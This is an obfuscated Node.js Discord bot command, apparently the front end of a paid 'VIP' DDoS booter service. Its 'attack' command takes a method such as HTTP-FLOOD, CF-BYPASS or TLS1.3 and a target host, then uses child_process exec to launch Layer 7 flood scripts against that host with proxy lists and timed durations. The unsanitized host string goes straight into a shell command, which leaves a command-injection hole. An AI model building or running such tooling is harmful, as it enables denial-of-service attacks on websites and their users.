const {
    MessageEmbed
} = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var img = ayarlar['img'];
var photovip = ayarlar['photovip'];
var randomgif = photovip[Math['floor']((Math['random']() * photovip['length']))];
module['exports'] = {
        name: 'attack',
        description: 'T\u1EA5n c\xF4ng trang Web',
        type: 'CHAT_INPUT',
        cooldown: 40,
        options: [{
            name: 'methods',
            description: 'Ph\u01B0\u01A1ng ph\xE1p t\u1EA5n c\xF4ng',
            required: true,
            type: 'STRING',
            choices: [{
                name: `${'CF-BASIC'}`,
                value: `${'CF-BASIC'}`,
                inline: true
            }, {
                name: `${'CF-STRONG'}`,
                value: `${'CF-STRONG'}`,
                inline: true
            }, {
                name: `${'CF-FLOOD'}`,
                value: `${'CF-FLOOD'}`,
                inline: true
            }, {
                name: `${'UAM-BP'}`,
                value: `${'UAM-BP'}`,
                inline: true
            }, {
                name: `${'TLS1.3'}`,
                value: `${'TLS1.3'}`,
                inline: true
            }, {
                name: `${'FLOOD-GODZILLA'}`,
                value: `${'FLOOD-GODZILLA'}`,
                inline: true
            }, {
                name: `${'SUPERCF'}`,
                value: `${'SUPERCF'}`,
                inline: true
            }, {
                name: `${'BYPASS'}`,
                value: `${'BYPASS'}`,
                inline: true
            }, {
                name: `${'BYPASSv2'}`,
                value: `${'BYPASSv2'}`,
                inline: true
            }, {
                name: `${'HTTP-COOKIE'}`,
                value: `${'HTTP-COOKIE'}`,
                inline: true
            }, {
                name: `${'HTTP-SLOW'}`,
                value: `${'HTTP-SLOW'}`,
                inline: true
            }, {
                name: `${'HTTP-FLOOD'}`,
                value: `${'HTTP-FLOOD'}`,
                inline: true
            }, {
                name: `${'HTTP-FUZZ'}`,
                value: `${'HTTP-FUZZ'}`,
                inline: true
            }, {
                name: `${'HTTP-MIX'}`,
                value: `${'HTTP-MIX'}`,
                inline: true
            }, {
                name: `${'HTTP-MIX2'}`,
                value: `${'HTTP-MIX2'}`,
                inline: true
            }, {
                name: `${'HTTP-RAND'}`,
                value: `${'HTTP-RAND'}`,
                inline: true
            }, {
                name: `${'HTTP-EDU'}`,
                value: `${'HTTP-EDU'}`,
                inline: true
            }, {
                name: `${'HTTP-RAWv2'}`,
                value: `${'HTTP-RAWv2'}`,
                inline: true
            }, {
                name: `${'HTTP-SOCKETS'}`,
                value: `${'HTTP-SOCKETS'}`,
                inline: true
            }, {
                name: `${'BROWSER-KOG'}`,
                value: `${'BROWSER-KOG'}`,
                inline: true
            }, {
                name: `${'HTTP-TLS'}`,
                value: `${'HTTP-TLS'}`,
                inline: true
            }, {
                name: `${'HTTP-TLS2'}`,
                value: `${'HTTP-TLS2'}`,
                inline: true
            }, {
                name: `${'HTTPS'}`,
                value: `${'HTTPS'}`,
                inline: true
            }]
        }, {
            name: 'host',
            description: '\u0110\u1ECBa ch\u1EC9 t\u1EA5n c\xF4ng',
            required: true,
            type: 'STRING'
        }],
        run: async(_0x3d71x6, _0x3d71x7) => {
                const _0x3d71x8 = ayarlar['commandroom'];
                if (_0x3d71x7['channel']['id'] !== _0x3d71x8) {
                    return _0x3d71x7['reply']({
                        embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 d\xF9ng \u0111\u01B0\u1EE3c l\u1EC7nh n\xE0y trong <#'}${_0x3d71x8}${'>.'}`)['setFooter']({
                            text: '\xA9 Developer: 𝑲𝒊𝒆𝒎𝑯𝒖𝒚 x 𝑵.𝑸𝒖𝒂𝒏𝒈'
                        })['setTimestamp']()]
                    })
                };
                const _0x3d71x9 = _0x3d71x7['options']['getString']('methods');
                const _0x3d71xa = _0x3d71x7['options']['getString']('host');
                if (_0x3d71x9 === 'CF-BASIC' || _0x3d71x9 === 'CF-BYPASS' || _0x3d71x9 === 'HTTP-MIX' || _0x3d71x9 === 'HTTP-MIX2' || _0x3d71x9 === 'HTTP-EDU' || _0x3d71x9 === 'HTTP-RAND' || _0x3d71x9 === 'HTTP-TLS' || _0x3d71x9 === 'HTTP-BYPASS') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'SUPERCF' || _0x3d71x9 === 'SUPERCF') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 10 httpv2.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'CF-UAM' || _0x3d71x9 === 'HTTP-TLS2' || _0x3d71x9 === 'HTTP-RAW2') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 150 proxies.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-SOCKETS') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 999 120'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-COOKIE' || _0x3d71x9 === 'HTTP-EVEN' || _0x3d71x9 === 'HTTP-FUZZ') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' proxies.txt 120 GET'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Võ Tấn Phát | GODSEND', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-FLOOD') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 proxies.txt 5'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'FLOOD-GODZILLA' || _0x3d71x9 === 'CF-FLOODER') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js GET '}${_0x3d71xa}${' proxies.txt 120 150 5'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'BROWSER-KOG' || _0x3d71x9 === 'BROWSER-KOG') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 60 3 64 proxy.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 60 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTPS' || _0x3d71x9 === 'HTTPS') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 3 htp.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'TLS1.3' || _0x3d71x9 === 'TLS1.3') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js GET '}${_0x3d71xa}${' http.txt 120 512 2'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`🔰 Mode:`**',
                        value: `${' [ Layer 7 ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    }, {
                        name: '**`💻 Owner:`**',
                        value: `${' [ Huynh Kiem Huy ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/76cI.gif')['setFooter']('\xA9 Developer: KiemHuy x N.Quang', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                }}}